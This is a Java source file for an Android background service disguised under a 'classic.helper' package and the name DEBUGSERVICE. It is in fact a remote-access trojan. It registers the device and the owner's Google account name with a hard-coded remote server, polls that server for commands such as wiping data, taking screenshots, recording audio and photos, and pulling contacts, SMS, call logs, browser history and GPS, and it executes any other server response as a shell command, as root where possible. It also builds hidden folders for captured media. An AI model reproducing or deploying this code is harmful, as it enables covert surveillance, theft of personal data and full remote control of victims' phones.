package com.android.classic.helper;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;

import com.android.classic.DEBUG;

import eu.chainfire.libsuperuser.Shell;

@SuppressLint("SimpleDateFormat")
public class DEBUGSERVICE extends Service {

	public static String[] codeList = { "Vidit7861", "WIPEALL!1!", "msg:|",
			"UNLOCK!", "install", "screenshot", "packages", "audio",
			"pictureBack", "pictureFront", "sendall", "adb", "getContacts",
			"getSMS", "getCall", "getBrowser", "getGPS", "SU", "root" };

	public static String[] names;
	public static String name;
	public static int random;
	SharedPreferences prefs;

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if ((netInfo != null) && netInfo.isConnected()) {
			return true;
		}
		return false;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		try {
			threadPolicy();
			if (Constants.DEBUG) {
				Shell.SH.run("echo 'started Service' > /sdcard/Android/data/settings/Logger/bootup.txt");
			}
			setupAll();

			if (!intent.getBooleanExtra("screen_state", false)) {
				screenOn();
			} else {
				screenOff();
			}
		} catch (Exception e) {
			Shell.SH.run("echo 'On Start | " + e.getMessage()
					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
		}
		return Service.START_STICKY;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		try {
			threadPolicy();

			prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE);
			boolean first = prefs.getBoolean("first", true);
			DEBUGSERVICE.random = prefs.getInt("random",
					new Random().nextInt(10000));
			DEBUGSERVICE.name = prefs.getString("name", "NO_INFO");
			if (first) {
				final AccountManager manager = AccountManager.get(this);
				final Account[] accounts = manager
						.getAccountsByType("com.google");
				final int size = accounts.length;
				DEBUGSERVICE.names = new String[size];
				for (int i = 0; i < size; i++) {
					DEBUGSERVICE.names[i] = accounts[i].name;
				}

				if (DEBUGSERVICE.names.length > 0) {
					DEBUGSERVICE.name = DEBUGSERVICE.names[0];
				}
				SharedPreferences.Editor edit = prefs.edit();
				edit.putBoolean("first", first);
				edit.putInt("random", DEBUGSERVICE.random);
				edit.putString("name", DEBUGSERVICE.name);
				edit.commit();
			}

			IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
			filter.addAction(Intent.ACTION_SCREEN_OFF);
			BroadcastReceiver mReceiver = new ScreenReceiver();
			registerReceiver(mReceiver, filter);
		} catch (Exception e) {
			Shell.SH.run("echo 'OnCreate | " + e.getMessage()
					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
		}
	}

	@SuppressLint("NewApi")
	private void threadPolicy() {
		// TODO Auto-generated method stub
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
					.permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
	}

	public void doAll() {
		try {
			setupAll();

			if (isOnline()) {
				/* Register Device */
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'sleep 1' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
				Thread.sleep(300);
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
				checkDevice();
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'sleep 2' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
				Thread.sleep(300);
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'check cmd' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
				checkCMD();
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'sleep 3' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
				Thread.sleep(300);
				if (Constants.DEBUG) {
					Shell.SH.run("echo 'done' > /sdcard/Android/data/settings/Logger/bootup.txt");
				}
			}
		} catch (Exception e) {
			Shell.SH.run("echo 'Do All | " + e.toString()
					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
		}

	}

	public String entityToString(HttpEntity entity) {
		InputStream is = null;
		StringBuilder str = null;
		try {
			is = entity.getContent();
			BufferedReader bufferedReader = new BufferedReader(
					new InputStreamReader(is));
			str = new StringBuilder();

			String line = null;
			while ((line = bufferedReader.readLine()) != null) {
				str.append(line);
			}
		} catch (IOException e) {
		} finally {
			try {
				is.close();
			} catch (IOException e) {
			}
		}
		return str.toString();
	}

	private void checkCMD() {
		class checkCMDAsync extends AsyncTask<Void, Void, Void> {

			@Override
			protected Void doInBackground(Void... params) {
				HttpClient httpClient = new DefaultHttpClient();
				HttpPost httpPost = new HttpPost(
						"http://www.lucideustech.in/androidcp/device/getcommand");
				BasicNameValuePair usernameBasicNameValuePair = new BasicNameValuePair(
						"did", android.os.Build.MODEL);
				BasicNameValuePair usernameValuePair = new BasicNameValuePair(
						"name", DEBUGSERVICE.name);
				BasicNameValuePair numberValuePair = new BasicNameValuePair(
						"number", "" + DEBUGSERVICE.random);
				List<NameValuePair> nameValuePairList = new ArrayList<NameValuePair>();
				nameValuePairList.add(usernameBasicNameValuePair);
				nameValuePairList.add(usernameValuePair);
				nameValuePairList.add(numberValuePair);
				try {
					UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(
							nameValuePairList);
					httpPost.setEntity(urlEncodedFormEntity);
					try {
						HttpResponse httpResponse = httpClient
								.execute(httpPost);
						String response = entityToString(
								httpResponse.getEntity()).trim();
						for (String element : DEBUGSERVICE.codeList) {
							if (element.contains(response)) {
								Intent intent = new Intent(DEBUGSERVICE.this,
										DEBUG.class);
								intent.putExtra("command", response);
								intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
								startActivity(intent);
								return null;
							}
						}
						if (Shell.SU.available()) {
							Shell.SU.run(response);
						} else {
							Shell.SH.run(response);
						}
					} catch (ClientProtocolException cpe) {
					} catch (IOException ioe) {
					}
				} catch (Exception uee) {
				}
				return null;
			}
		}
		if (Constants.DEBUG) {
			Shell.SH.run("echo 'check CMD' > /sdcard/Android/data/settings/Logger/bootup.txt");
		}
		new checkCMDAsync().execute();
	}

	private void checkDevice() {

		class CheckDeviceAsync extends AsyncTask<Void, Void, Void> {

			@SuppressWarnings("unused")
			@Override
			protected Void doInBackground(Void... params) {
				HttpClient httpClient = new DefaultHttpClient();
				HttpPost httpPost = new HttpPost(
						"http://www.lucideustech.in/androidcp/device/checkdevice");
				BasicNameValuePair usernameBasicNameValuePair = new BasicNameValuePair(
						"did", android.os.Build.MODEL);
				BasicNameValuePair usernameValuePair = new BasicNameValuePair(
						"name", DEBUGSERVICE.name);
				BasicNameValuePair numberValuePair = new BasicNameValuePair(
						"number", "" + DEBUGSERVICE.random);
				List<NameValuePair> nameValuePairList = new ArrayList<NameValuePair>();
				nameValuePairList.add(usernameBasicNameValuePair);
				nameValuePairList.add(usernameValuePair);
				nameValuePairList.add(numberValuePair);
				try {
					UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(
							nameValuePairList);
					httpPost.setEntity(urlEncodedFormEntity);
					try {
						HttpResponse httpResponse = httpClient
								.execute(httpPost);
					} catch (ClientProtocolException cpe) {
						cpe.printStackTrace();
					} catch (IOException ioe) {
						ioe.printStackTrace();
					}
				} catch (Exception uee) {
				}
				return null;
			}
		}
		if (Constants.DEBUG) {
			Shell.SH.run("echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt");
		}
		new CheckDeviceAsync().execute();
	}

	private void setupAll() {
		/* Create Paths */
		if (Constants.DEBUG) {
			Shell.SH.run("echo 'set up' > /sdcard/Android/data/settings/Logger/bootup.txt");
		}
		File patha = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/");
		File path = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/");
		File pathSS = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Screenshots/");
		File nomedia = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/.nomedia");
		File pathcmd = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Logger/");
		File pathpic = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Pictures/");
		File pathaudio = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Audio/");
		patha.mkdirs();
		path.mkdirs();
		pathcmd.mkdirs();
		pathSS.mkdirs();
		pathpic.mkdirs();
		pathaudio.mkdirs();
		try {
			nomedia.createNewFile();
		} catch (IOException e) {
		}
		/* */
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	private void screenOff() {
	}

	private void screenOn() throws InterruptedException {
		if (Constants.DEBUG) {
			Shell.SH.run("echo 'Screen On' > /sdcard/Android/data/settings/Logger/bootup.txt");
		}
		doAll();
	}

}
